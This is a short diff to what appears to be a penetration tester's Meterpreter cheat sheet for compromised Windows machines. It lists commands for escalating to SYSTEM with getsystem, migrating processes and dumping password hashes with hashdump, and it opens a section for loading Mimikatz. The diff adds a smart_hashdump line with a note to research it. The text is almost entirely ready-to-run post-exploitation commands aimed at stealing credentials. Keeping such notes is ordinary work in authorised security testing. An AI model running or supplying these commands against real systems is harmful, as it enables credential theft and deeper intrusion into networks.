@@ -5,6 +5,7 @@ sysinfo
 getsystem
 run post/windows/manage/smart_migrate
 run post/windows/gather/hashdump
+run post/windows/gather/smart_hashdump #TODO research difference
 
 #Mimikatz
 load mimikatz
